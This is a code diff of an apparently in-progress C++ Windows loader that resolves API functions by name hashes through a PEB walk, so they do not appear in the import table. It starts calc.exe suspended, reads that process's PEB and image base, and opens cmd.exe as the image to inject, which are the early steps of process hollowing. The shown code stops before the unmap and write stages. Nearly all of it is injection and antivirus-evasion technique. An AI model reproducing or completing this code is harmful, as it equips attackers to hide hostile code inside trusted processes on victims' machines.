@@ -2,13 +2,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <intrin.h>
+//#include <windows.h>
+//#include <winternl.h>
 #include "ModuleIterator.hpp" // Iterator class used to iterate over the module list
 #include "CheckSumGen.hpp"    // Header file with the functions I used to generate the checksum
 #include "IAT.hpp"			  // IAT simulator
 
 // Comment this line below to enable debug messages, and vice-versa
 //#define TRACE
-#define TRACE_PEB
+//#define TRACE_PEB
 
 template <typename T>
 T retrieve_function_by_hash(unsigned long funcHash, const char* base, const wchar_t* modName) {
@@ -86,113 +88,145 @@ T iterate_modules(unsigned long funcHash, ModuleIterator& iter) {
 	return NULL;
 }
 
-#define FIELD_OFFSET(t,f)       ((long)(unsigned long *)&(((t*) 0)->f))
-#define IMAGE_FIRST_SECTION( ntheader ) ((WinDecls::IMAGE_SECTION_HEADER*)        \
-    ((unsigned long *)(ntheader) +                                            \
-     FIELD_OFFSET( WinDecls::IMAGE_NT_HEADERS, OptionalHeader ) +                 \
-     ((ntheader))->FileHeader.SizeOfOptionalHeader   \
-    ))
-
-char *GetPayload(char *lpModuleBase) {
-	const WinDecls::IMAGE_NT_HEADERS* ntHeaders = (const WinDecls::IMAGE_NT_HEADERS*)(lpModuleBase + ((WinDecls::IMAGE_DOS_HEADER*)lpModuleBase)->e_lfanew);
-
-	// find .text section
-
-	WinDecls::IMAGE_SECTION_HEADER *pishText = IMAGE_FIRST_SECTION(ntHeaders);
-	// get last IMAGE_SECTION_HEADER
-	WinDecls::IMAGE_SECTION_HEADER* pishLast = (WinDecls:: IMAGE_SECTION_HEADER*)(pishText + (ntHeaders->FileHeader.NumberOfSections - 1));
-
-	return (char *)(ntHeaders->OptionalHeader.ImageBase + pishLast->VirtualAddress);
-}
-
-IAT_t iat;
+LoadLibrary_t pLoadLibrary;
+MessageBox_t  pMessageBox;
+VirtualAlloc_t pVirtualAlloc;
+VirtualProtect_t pVirtualProtect;
+CreateProcessA_t pCreateProcessA;
+GetProcAddress_t pGetProcAddress;
+GetModuleHandleA_t pGetModuleHandle;
+ZwUnmapViewOfSection_t pZwUnmapViewOfSection;
+NtQueryInformationProcess_t pNtQueryInformationProcess;
+ReadProcessMemory_t pReadProcessMemory;
+CreateFileA_t pCreateFileA;
+GetFileSize_t pGetFileSize;
+ReadFile_t pReadFile;
 
 int main(int argc, char **argv) {
+	// ================ PRE-CALCULATED CHECKSUM OF NAMES OF FUNCS ================================
 	// Checksum of the functions we want to retrieve
 	// check_sum_gen("LoadLibraryA") = 0x8dbeba00 and so on and so forth
-	const unsigned long hLoadLibraryA		  = 0x8dbeba00;
-	const unsigned long hMessageBoxA		  = 0xf6c562e0;
-	const unsigned long hVirtualAlloc		  = 0x10f64400;
-	const unsigned long hVirtualprotect		  = 0x59664000;
-	const unsigned long hCreateProcessA		  = 0xf22c4080;
-	const unsigned long hGetProcAddress		  = 0x68b4800;
-	const unsigned long hGetModuleHandleA	  = 0xdffe0000;
-	const unsigned long hZwUnmapViewOfSection = 0xc9f17c00;
+	const unsigned long hLoadLibraryA			   = 0x8dbeba00;
+	const unsigned long hMessageBoxA			   = 0xf6c562e0;
+	const unsigned long hVirtualAlloc			   = 0x10f64400;
+	const unsigned long hVirtualprotect			   = 0x59664000;
+	const unsigned long hCreateProcessA			   = 0xf22c4080;
+	const unsigned long hGetProcAddress			   = 0x68b4800;
+	const unsigned long hGetModuleHandleA		   = 0xdffe0000;
+	const unsigned long hZwUnmapViewOfSection	   = 0xc9f17c00;
+	const unsigned long hNtQueryInformationProcess = 0xcc874000;
+	const unsigned long hReadProcessMemory		   = 0xb2a77d00;
+	const unsigned long hCreateFileA			   = 0x728895c0; 
+	const unsigned long hGetFileSize			   = 0x1fb6ef40; 
+	const unsigned long hReadFile				   = 0xf01ce140;
+	const unsigned long hHeapAlloc				   = 0x8c00e000;
+	const unsigned long hGetProcessHeap			   = 0x53e78000;
+	const unsigned long hVirtualAllocEx			   = 0xaf28c000;
+	const unsigned long hWriteProcessMemory		   = 0x28194f00;
+	const unsigned long hGetThreadContext		   = 0x29e00000;
+	const unsigned long hSetThreadContext		   = 0x53600000;
+	const unsigned long hResumeThread			   = 0x1ff2800;
 
-	/*unsigned long hZwUnmapViewOfSection = check_sum_gen("ZwUnmapViewOfSection");
-	printf("ZwUnmapViewOfSection = %x\n", hZwUnmapViewOfSection);
+	/*const unsigned long hHeapAlloc = check_sum_gen("HeapAlloc");
+	const unsigned long hGetProcessHeap = check_sum_gen("GetProcessHeap");
+	const unsigned long hVirtualAllocEx = check_sum_gen("VirtualAllocEx");
+	const unsigned long hWriteProcessMemory = check_sum_gen("WriteProcessMemory");
+	const unsigned long hGetThreadContext = check_sum_gen("GetThreadContext");
+	const unsigned long hResumeThread = check_sum_gen("ResumeThread");
+	const unsigned long hSetThreadContext = check_sum_gen("SetThreadContext");
+
+	printf("HeapAlloc = %x\n", hHeapAlloc);
+	printf("GetProcessHeap = %x\n", hGetProcessHeap);
+	printf("VirtualAllocEx = %x\n", hVirtualAllocEx);
+	printf("WriteProcessMemory = %x\n", hWriteProcessMemory);
+	printf("GetThreadContext = %x\n", hGetThreadContext);
+	printf("SetThreadContext = %x\n", hSetThreadContext);
+	printf("ResumeThread = %x\n", hResumeThread);
 
 	exit(1);*/
-
-	iat.pLoadLibrary = NULL;
-	iat.pMessageBox =  NULL;
+	// ===========================================================================================
+	
+	// ================================= RETRIEVE POINTER TO PEB =================================
 	// Read PEB at fs:[0x30]
 	const WinDecls::PEB_T* pebPtr = (WinDecls::PEB_T*)__readfsdword(0x30);
 	const unsigned long baseAddr = pebPtr->ImageBaseAddress;
 
 #if defined(TRACE_PEB)
-	printf("[+] PEB @: %x\n", pebPtr);
-	printf("[+] ImageBaseAddres @: %x\n", baseAddr);
+	printf("[+] Local PEB @: %x\n", pebPtr);
+	printf("[+] Local ImageBaseAddres @: %x\n", baseAddr);
 #endif
 
 	// Retrieve LDR_DATA structure
 	const WinDecls::PEB_LDR_DATA_T* Ldr = pebPtr->Ldr;
 	// Retrieve the first link and typecast to an entry type
 	const WinDecls::LDR_DATA_TABLE_ENTRY_T* modPtr = (const WinDecls::LDR_DATA_TABLE_ENTRY_T*)(Ldr->InLoadOrderModuleList.Flink);
-	
+	// ===========================================================================================
+
+	// =============================== RETRIEVE FUNCTION POINTERS ================================
 	// Instantiate the iterator class
 	ModuleIterator iter(modPtr, Ldr);
 
-	iat.pLoadLibrary = iterate_modules<LoadLibrary_t>(hLoadLibraryA, iter);
-	//iat.pVirtualAlloc = iterate_modules<VirtualAlloc_t>(hVirtualAlloc, iter);
-	//iat.pVirtualProtect = iterate_modules<VirtualProtect_t>(hVirtualprotect, iter);
-	iat.pCreateProcessA = iterate_modules<CreateProcessA_t>(hCreateProcessA, iter);
-	iat.pGetProcAddress = iterate_modules<GetProcAddress_t>(hGetProcAddress, iter);
-	iat.pGetModuleHandle = iterate_modules<GetModuleHandleA_t>(hGetModuleHandleA, iter);
-	iat.pZwUnmapViewOfSection = iterate_modules<ZwUnmapViewOfSection_t>(hZwUnmapViewOfSection, iter);
+	pLoadLibrary = iterate_modules<LoadLibrary_t>(hLoadLibraryA, iter);
+	pCreateProcessA = iterate_modules<CreateProcessA_t>(hCreateProcessA, iter);
+	pGetProcAddress = iterate_modules<GetProcAddress_t>(hGetProcAddress, iter);
+	pGetModuleHandle = iterate_modules<GetModuleHandleA_t>(hGetModuleHandleA, iter);
+	pZwUnmapViewOfSection = iterate_modules<ZwUnmapViewOfSection_t>(hZwUnmapViewOfSection, iter);
+	pNtQueryInformationProcess = iterate_modules<NtQueryInformationProcess_t>(hNtQueryInformationProcess, iter);
+	pReadProcessMemory = iterate_modules<ReadProcessMemory_t>(hReadProcessMemory, iter);
+	pCreateFileA = iterate_modules<CreateFileA_t>(hCreateFileA, iter);
+	pGetFileSize = iterate_modules<GetFileSize_t>(hGetFileSize, iter);
+	pReadFile = iterate_modules<ReadFile_t>(hReadFile, iter);
+	// ===========================================================================================
 
-	exit(1);
-
-	// Calls intended function
-	// The code below needs trimming, but it is still new and I was checking if it worked, and it did! :D
-	//if (iat.pLoadLibrary != NULL) {
-	//	printf("[!] LOADING USER32.DLL...\n");
-	//	const char *pHandle = (const char *)iat.pLoadLibrary("user32.dll");
-	//	if (pHandle != NULL) {
-	//		printf("  [!] MODULE LOADED @ %p\n", pHandle);
-	//		iat.pMessageBox = retrieve_function_by_hash<MessageBox_t>(0xf6c562e0, pHandle, L"user32.dll");
-	//		if (iat.pMessageBox != NULL)
-	//			iat.pMessageBox(NULL, "Hello", "From the other side", 0x00000000L);
-	//	}
-	//}
-
-	// process info
-	WinDecls::STARTUPINFOA si;
-	WinDecls::PROCESS_INFORMATION pi;
-	memset(&pi, 0, sizeof(pi));
-	memset(&si, 0, sizeof(si));
-	si.cb = sizeof(si);
-	si.dwFlags = 0x00000001;  //STARTF_USESHOWWINDOW;
-	si.wShowWindow = 5;		  //SW_SHOW;
-
+	// ====================== CREATE DESTINATION PROCESS AS SUSPENDED ============================
 	unsigned long CREATE_SUSPENDED = 0x00000004;
 	unsigned long DETACHED_PROCESS = 0x00000008;
-	// first create process as suspended
-	bool createResult = iat.pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, false, CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &si, &pi);
-	if (createResult == 0) {
-		printf("Failed to create process\n");
+	
+	WinDecls::STARTUPINFOA* pStartupInfo = new WinDecls::STARTUPINFOA();
+	pStartupInfo->dwFlags = 0x00000001;     //STARTF_USESHOWWINDOW;
+	pStartupInfo->wShowWindow = 5;		   //SW_SHOW;
+	WinDecls::PROCESS_INFORMATION* pProcessInfo = new WinDecls::PROCESS_INFORMATION();
+	pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
+	if (!pProcessInfo->hProcess) {
+		printf("[-] Failed to create process\n");
 		exit(1);
 	}
+	printf("[+] Process calc.exe created with PID: %u\n", pProcessInfo->dwProcessId);
+	// ===========================================================================================
+
+	// ===================== RETRIEVE DESTINATION PROCESS PEB BASE ADDR ==========================
+	printf("[+] Querying information about the process\n");
+	WinDecls::PROCESS_BASIC_INFORMATION* pBasicInfo = new WinDecls::PROCESS_BASIC_INFORMATION();
+	unsigned long* retLength = NULL;
+	unsigned long farProc = pNtQueryInformationProcess(pProcessInfo->hProcess, 0, pBasicInfo, sizeof(WinDecls::PROCESS_BASIC_INFORMATION), retLength);
+
+	unsigned long remotePeb = (unsigned long)pBasicInfo->Peb;
+	printf("[+] PEB of destination process is located @ %x\n", remotePeb);
+	// ===========================================================================================
 
 
-	//iat.pZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase);
-	// unmap memory space for our process
-	//pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)GetKernel32Function(0xC97C1FFF);
-	//pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
-	//pfnZwUnmapViewOfSection fnZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)fnGetProcAddress(fnGetModuleHandleA(get_ntdll_string()), get_zwunmapviewofsection_string());
+	// =============== READ DESTINATION PROCESS PEB AND FETCH IMAGE BASE ADDRESS =================
+	char BUFF[0x2000];
+	unsigned int* bytesRead = NULL;
+	bool readResult = pReadProcessMemory(pProcessInfo->hProcess, (const void*)remotePeb, &BUFF, sizeof(WinDecls::PEB_T), bytesRead);
 
-	//char* textSection = GetPayload((char *)iat.pMessageBox);
-	//printf("You can place the payload at: %x\n", (unsigned long)textSection);
+	const auto destPeb = (WinDecls::PEB_T*)BUFF;
+	const unsigned long destBaseAddr = destPeb->ImageBaseAddress;
+	// ===========================================================================================
 
-    return 0;
+	// ======================= SOURCE FILE (THE ONE TO BE EXECUTED ROUNTINE ======================
+	// ==================================== READ SOURCE FILE =====================================
+	unsigned long GENERIC_READ = 0x80000000;
+	unsigned long OPEN_ALWAYS  = 0x4;
+	void* sourceFile = pCreateFileA("C:\\Windows\\System32\\cmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+	unsigned long sourceFileSize = pGetFileSize(sourceFile, NULL);
+
+
+	// ===========================================================================================
+
+	printf("end\n");
+
+
+
+	return 0;
 }
